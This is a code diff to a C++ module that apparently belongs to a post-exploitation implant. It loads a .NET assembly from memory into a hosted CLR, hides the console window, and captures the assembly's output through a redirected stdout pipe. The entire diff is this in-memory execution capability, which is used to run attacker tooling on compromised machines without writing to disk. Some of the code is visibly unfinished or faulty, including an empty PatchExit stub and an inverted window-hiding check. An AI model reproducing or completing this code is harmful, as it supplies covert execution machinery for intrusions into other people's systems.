@@ -15,44 +15,44 @@ auto DECLFN Dotnet::Inline(
     KhDbg( "using app domain %S", AppDomName );
     KhDbg( "version: %S", Version );
 
-    PWCHAR* AsmArgv   = NULL;
-    INT     AsmArgc   = 0;
+    PWCHAR* AsmArgv   = {};
+    ULONG   AsmArgc   = {};
     BOOL    Success   = FALSE;
     HANDLE  BackupOut = INVALID_HANDLE_VALUE;
     HANDLE  PipeWrite = INVALID_HANDLE_VALUE;
     HANDLE  PipeRead  = INVALID_HANDLE_VALUE;
     HWND    WinHandle = NULL;
 
-    SAFEARRAYBOUND SafeBound = { 0 };
-    SAFEARRAY*     SafeAsm   = { 0 };
-    SAFEARRAY*     SafeExpc  = { 0 };
-    SAFEARRAY*	   SafeArgs  = { 0 };
+    SAFEARRAYBOUND SafeBound = {};
+    SAFEARRAY*     SafeAsm   = {};
+    SAFEARRAY*     SafeExpc  = {};
+    SAFEARRAY*	   SafeArgs  = {};
 
     BOOL             IsLoadable  = FALSE;
     HRESULT          HResult     = 0;
-    VARIANT          VariantArgv = { 0 };
-    _Assembly*       Assembly    = { 0 };
-    _AppDomain*      AppDom      = { 0 };
-    _MethodInfo*     MethodInfo  = { 0 };
-    IUnknown*        AppDomThunk = { 0 };
-    IEnumUnknown*    EnumUkwn    = { 0 };
-    ICLRMetaHost*    MetaHost    = { 0 };
-    ICLRRuntimeInfo* RtmInfo     = { 0 };
-    ICorRuntimeHost* RtmHost     = { 0 };
+    VARIANT          VariantArgv = {};
+    _Assembly*       Assembly    = {};
+    _AppDomain*      AppDom      = {};
+    _MethodInfo*     MethodInfo  = {};
+    IUnknown*        AppDomThunk = {};
+    IEnumUnknown*    EnumUkwn    = {};
+    ICLRMetaHost*    MetaHost    = {};
+    ICLRRuntimeInfo* RtmInfo     = {};
+    ICorRuntimeHost* RtmHost     = {};
 
     LONG Idx = 0;
 
     SECURITY_ATTRIBUTES SecAttr = { 0 };
 
-    HResult = Kh->Mscoree.CLRCreateInstance( 
-        Kh->Dot->GUID.xCLSID_CLRMetaHost, Kh->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
+    HResult = Self->Mscoree.CLRCreateInstance( 
+        Self->Dot->GUID.xCLSID_CLRMetaHost, Self->Dot->GUID.xIID_ICLRMetaHost, (PVOID*)&MetaHost 
     );
     if ( HResult ) goto _KH_END;
 
     HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
     if ( HResult ) goto _KH_END;
 
-    HResult = MetaHost->GetRuntime( Version, Kh->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
+    HResult = MetaHost->GetRuntime( L"v4.0.30319", Self->Dot->GUID.xIID_ICLRRuntimeInfo, (PVOID*)&RtmInfo );
     if ( HResult ) goto _KH_END;
 
     HResult = RtmInfo->IsLoadable( &IsLoadable );
@@ -60,7 +60,7 @@ auto DECLFN Dotnet::Inline(
     if ( HResult || !IsLoadable ) goto _KH_END;
 
     HResult = RtmInfo->GetInterface( 
-        Kh->Dot->GUID.xCLSID_CorRuntimeHost, Kh->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
+        Self->Dot->GUID.xCLSID_CorRuntimeHost, Self->Dot->GUID.xIID_ICorRuntimeHost, (PVOID*)&RtmHost 
     );
     if ( HResult ) goto _KH_END;
 
@@ -70,11 +70,11 @@ auto DECLFN Dotnet::Inline(
     HResult = RtmHost->CreateDomain( AppDomName, 0, &AppDomThunk );
     if ( HResult ) goto _KH_END;
 
-    HResult = AppDomThunk->QueryInterface( Kh->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
+    HResult = AppDomThunk->QueryInterface( Self->Dot->GUID.xIID_AppDomain, (PVOID*)&AppDom );
     if ( HResult ) goto _KH_END;
 
     SafeBound = { AsmLength, 0 };
-    SafeAsm   = Kh->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );
+    SafeAsm   = Self->Oleaut32.SafeArrayCreate( VT_UI1, 1, &SafeBound );
 
     Mem::Copy( SafeAsm->pvData, AsmBytes, AsmLength );
 
@@ -87,64 +87,65 @@ auto DECLFN Dotnet::Inline(
     HResult = MethodInfo->GetParameters( &SafeExpc );
     if ( HResult ) goto _KH_END;
     
-    if ( SafeExpc ) {
-        if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
-    
-            SafeArgs = Kh->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
+	if ( SafeExpc ) {
+		if ( SafeExpc->cDims && SafeExpc->rgsabound[0].cElements ) {
+			SafeArgs = Self->Oleaut32.SafeArrayCreateVector( VT_VARIANT, 0, 1 );
 
-            if ( Str::LengthW( Arguments ) ) {
-                AsmArgv = Kh->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
-            }
+			if ( Arguments ) {
+                if ( Str::LengthW( Arguments ) ) {
+                    AsmArgv = Self->Shell32.CommandLineToArgvW( Arguments, (PINT)&AsmArgc );
+                }
+			}
 
-            VariantArgv.parray = Kh->Oleaut32.SafeArrayCreateVector( VT_BSTR, 0, AsmArgc );
-            VariantArgv.vt     = ( VT_ARRAY | VT_BSTR );
+			VariantArgv.parray = Self->Oleaut32.SafeArrayCreateVector(VT_BSTR, 0, AsmArgc);
+			VariantArgv.vt     = (VT_ARRAY | VT_BSTR);
 
-            for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
-        
+			for ( Idx = 0; Idx < AsmArgc; Idx++ ) {
+				Self->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Self->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
+			}
 
-                Kh->Oleaut32.SafeArrayPutElement( VariantArgv.parray, &Idx, Kh->Oleaut32.SysAllocString( AsmArgv[Idx] ) );
-            }
-            Kh->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
-            Kh->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
-        }
-    }
+			Idx = 0;
+			Self->Oleaut32.SafeArrayPutElement( SafeArgs, &Idx, &VariantArgv );
+			Self->Oleaut32.SafeArrayDestroy( VariantArgv.parray );
+		}
+	}
 
     SecAttr = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
 
-    Kh->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );
+    Self->Krnl32.CreatePipe( &PipeRead, &PipeWrite, &SecAttr, PIPE_BUFFER_LENGTH );
 
-    WinHandle = Kh->Krnl32.GetConsoleWindow();
+    WinHandle = Self->Krnl32.GetConsoleWindow();
 
     if ( !WinHandle ) {
-        Kh->Krnl32.AllocConsole();
+        Self->Krnl32.AllocConsole();
 
-        if ( !( WinHandle = Kh->Krnl32.GetConsoleWindow() ) ) {
-            Kh->User32.ShowWindow( WinHandle, SW_HIDE );
+        if ( !( WinHandle = Self->Krnl32.GetConsoleWindow() ) ) {
+            Self->User32.ShowWindow( WinHandle, SW_HIDE );
         }
     }
 
-    BackupOut = Kh->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
-    Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
+    BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
+    Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
+
+    KhDbg( "invoking .NET assembly" );
 
     HResult = MethodInfo->Invoke_3( VARIANT(), SafeArgs, NULL );
     if ( HResult ) goto _KH_END;
 
-    Kh->Dot->Buffer.a = (PCHAR)Kh->Hp->Alloc( PIPE_BUFFER_LENGTH );
+    Self->Dot->Buffer.a = (PCHAR)Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
 
-    Success = Kh->Krnl32.ReadFile( PipeRead, Kh->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Kh->Dot->Buffer.s, 0 );
+    Success = Self->Krnl32.ReadFile( PipeRead, Self->Dot->Buffer.a, PIPE_BUFFER_LENGTH, &Self->Dot->Buffer.s, 0 );
 
-    KhDbg( "dotnet asm output [%d bytes] %s", Kh->Dot->Buffer.s, Kh->Dot->Buffer.a );
+    KhDbg( "dotnet asm output [%d bytes] %s", Self->Dot->Buffer.s, Self->Dot->Buffer.a );
 _KH_END:
     if ( HResult ) {    
-        KhDbg( "HRESULT: %X", HResult );
-
         LPSTR errorMessage = NULL;
         DWORD flags = 
             FORMAT_MESSAGE_ALLOCATE_BUFFER | 
             FORMAT_MESSAGE_FROM_SYSTEM | 
             FORMAT_MESSAGE_IGNORE_INSERTS;
     
-        DWORD result = Kh->Krnl32.FormatMessageA(
+        DWORD result = Self->Krnl32.FormatMessageA(
             flags, NULL, HResult,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
             (LPSTR)&errorMessage, 0, NULL 
         );
@@ -154,22 +155,22 @@ _KH_END:
         }
     
         if ( errorMessage != NULL ) {
-            Kh->Hp->Free( errorMessage, Str::LengthA( errorMessage ) );
+            // Self->Hp->Free( errorMessage, Str::LengthA( errorMessage ) );
         }
     }
 
-    if ( BackupOut ) Kh->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
+    if ( BackupOut ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupOut );
 
     if ( AsmArgv ) {
-        Kh->Hp->Free( AsmArgv, Str::LengthW( *AsmArgv ) ); AsmArgv = NULL;
+        Self->Hp->Free( AsmArgv, Str::LengthW( *AsmArgv ) ); AsmArgv = NULL;
     }
 
     if ( SafeAsm ) {
-        Kh->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = NULL;
+        Self->Oleaut32.SafeArrayDestroy( SafeAsm ); SafeAsm = NULL;
     }
 
     if ( SafeArgs ) {
-        Kh->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = NULL;
+        Self->Oleaut32.SafeArrayDestroy( SafeArgs ); SafeArgs = NULL;
     }
 
     if ( MethodInfo ) {
@@ -185,4 +186,10 @@ _KH_END:
     }
 
     return HResult;
+}
+
+auto Dotnet::PatchExit(
+    _In_ ICorRuntimeHost* IRuntime
+) -> HRESULT {
+    
 }
